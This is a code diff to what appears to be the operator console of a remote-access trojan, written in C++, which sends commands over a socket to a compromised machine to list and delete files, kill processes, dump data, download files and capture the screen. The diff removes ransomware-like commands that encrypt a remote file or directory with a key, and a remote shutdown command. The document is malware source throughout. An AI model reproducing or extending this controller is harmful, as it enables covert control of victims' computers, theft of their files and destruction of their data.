@@ -26,6 +26,7 @@ enum commands {
 	HELP = 1,
 	CLOSE,
 	PWD,
+	CMD,
 	LS,
 	RM,
 	RMDIR,
@@ -33,13 +34,10 @@ enum commands {
 	PS,
 	KILL,
 	DUMP,
-	CRYPTFILE,
-	CRYPTDIR,
 	DOWNLOAD,
-	SHUTDOWN,
 	ERR,
 	SCREENCAP,
-	CMD
+
 };
 
 int main() {
@@ -190,33 +188,6 @@ int main() {
 				std::cout << buffer << std::endl;
 				break;
 
-			case CRYPTFILE:
-				send(conn, "cryptfile", 9, NULL);
-				std::cout << "path to file > ";
-				std::getline(std::cin, path);
-				send(conn, path.c_str(), path.length(), NULL);
-				std::cout << "key (int 1-100) > ";
-				std::getline(std::cin, key);
-				send(conn, key.c_str(), sizeof(key), NULL);
-				std::cout << "wait ...\n";
-
-				recv(conn, buffer, sizeof(buffer), NULL);
-				std::cout << buffer << std::endl;
-				break;
-
-			case CRYPTDIR:
-				send(conn, "cryptdir", 8, NULL);
-				std::cout << "path to directory > ";
-				std::getline(std::cin, path);
-				send(conn, path.c_str(), path.length(), NULL);
-				std::cout << "key (int 1-100) > ";
-				std::getline(std::cin, key);
-				send(conn, key.c_str(), sizeof(key), NULL);
-				std::cout << "wait ...\n";
-				recv(conn, buffer, sizeof(buffer), NULL);
-				std::cout << buffer << std::endl;
-				break;
-
 			case DOWNLOAD:
 				send(conn, "download", 8, NULL);
 				std::cout << "full path to file > ";
@@ -250,12 +221,6 @@ int main() {
 					std::cout << " download: /downloads/" << temp_file_name << " succes\n";
 				}
 				break;
-
-			case SHUTDOWN:
-				send(conn, "shutdown", 8, NULL);
-				std::cout << "ok\n";
-				return 0;
-
 			case ERR:
 				send(conn, "error", 5, NULL);
 				std::cout << "enter name error > ";
